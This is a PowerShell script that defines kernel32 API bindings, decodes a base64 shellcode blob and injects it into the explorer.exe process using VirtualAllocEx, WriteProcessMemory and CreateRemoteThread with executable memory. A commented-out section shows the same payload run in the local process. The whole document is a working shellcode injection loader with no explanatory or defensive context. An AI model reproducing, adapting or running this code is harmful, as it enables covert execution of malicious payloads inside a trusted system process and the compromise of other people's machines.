
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 
{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


}
"@
    
    Add-Type $Kernel32
    [Byte[]] $buf = [System.Convert]::FromBase64String("SDHtVEi/3PWcQ9eA6YpAtXRBXGZBgeRw9draSQ+uBCRNi1QkCEj/zUkxfOoZSIXtdfMFGNTKMeZobFwO1HIeyFOA918BLGtdfsLTW5ryushqTNS5F1WffyDD7aFWcp8FIP8vtz4LAt64HvW8EKqFdHnKFSJxqf+IM9ap30yhRUFXH8Clv6G1IhlmPxSooc8CIKRB0RBAkEIsaf4Vxe8IAIG0YhGUROM++2BBV1oi9YJ5aUHbMC6YSMQtQac9aOCvASBF3T1TIuSwnyPj6l0BcDA6c4fMftHoNzAMK4j2mFlYqCNlpxbxKkJhI+ESXEdny1gmmRNYPV/0mk+T2eilhCYAs9sbXRQ8uFH76ohpHee4YPtQCBQd57gg5ZZrxR3nmFD71O1GHyTbwB/nO3BXQMpBchJXTVStCO3hmgtE3j7Ki/HnEg2FCmt4q9BYA9Ae6gCzUNqEVWzqSDYbLmsdbTpQOJNCSN4sykmyC7laHZMjTYISG4dh5KIBZZNrzPktK8m+mlvNbYyf8f/YFihdKdPRxgMCSN4szkmyCzxN3mCiRDibRkVUvKuLt1MSDYUtskHrhQNWFDSrWfKBEo+5TKtSTDsCTQw2oouhMhHzqpO3SIIACUXrG4Nu2rU/eFUtvEg6OhPLlyCdJrQkj18GJGPh4IEXPZUh28ngiBO2bzqTp7PbWgyquQIPs9taPWxexDGF43Q4YkLbM4PbAETcraPHc4taDFUh28ngiDAPBiVQVzpEnAxVbOr/ZjPjDFVsxTTav2NLZz+GUPziLEUCWIBN/okJfRQVkEHhqj57Al+8MIChF0MFXt5rnuMMaBEu2WT39gNBLAWcUMWcAGsNWYtW/5IXVA05izLY9hNINzW9WIeTNV8FXtp1ipgiSCwnjVKFiwJAIAK5S4aEEHolIoZh/JcSTg0z00aEiGJlPieoZIa+blgPLrV00IQyWywHnWr6ijR8HD6bbd+MKUQKNIN26q0yayRY30PV7SBFJiWZbtWqNTsaGupIOhoJVhQ0pzF6iBK0VW7ChLPbWgwFP7lJdBmxWXtXFdX7UpxmXzO5WvtSq0FkpacxeogJRZKuxwaroKXZ0KyfH/scm4RGbOpJCZ+qObVs6gCzJI9EqqOeAlgXsllVbOpT6rEaVhzlO8FRyxPLlWz6ALOS4FTxPw8As9ta84AkeVPgk9PrHeUbSDoBE8uVbMoAs5LT9RzW+JY6OVoMVWwV1ftYnizQrJ6y1VBdRFSvb8DGCQLPDQbqWQg7RyZfLWPaTA6jt1HZ1UdTvL6M+oxXPgzoLdTTwH9/")
    $size = $buf.Length
    # [IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
    # [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
    # $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
    # [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")

    #try inject 
    $expProc=[System.Diagnostics.Process]::GetProcessesByName("explorer")
    $exppid = $expProc[0].Id
    $hProcess = [Kernel32]::OpenProcess(0x001F0FFF,0, $exppid)
    $addr = [Kernel32]::VirtualAllocEx($hProcess, 0, 0x10000, 0x3000, 0x40);
    $outSize = 0
    [Kernel32]::WriteProcessMemory($hProcess, $addr, $buf, $size, [ref]$outSize);
    $hThread = [Kernel32]::CreateRemoteThread($hProcess, 0, 0, $addr, 0, 0, 0);



